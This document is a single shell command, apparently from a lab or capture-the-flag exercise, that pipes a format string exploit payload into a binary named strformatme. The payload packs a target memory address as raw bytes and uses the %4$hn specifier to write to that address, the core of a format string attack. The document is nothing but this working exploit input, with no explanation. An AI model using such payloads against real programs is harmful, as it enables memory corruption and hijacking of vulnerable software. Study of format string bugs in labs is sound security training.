printf '\x68\x9a\x04\x08%%4$hn' | ./strformatme 
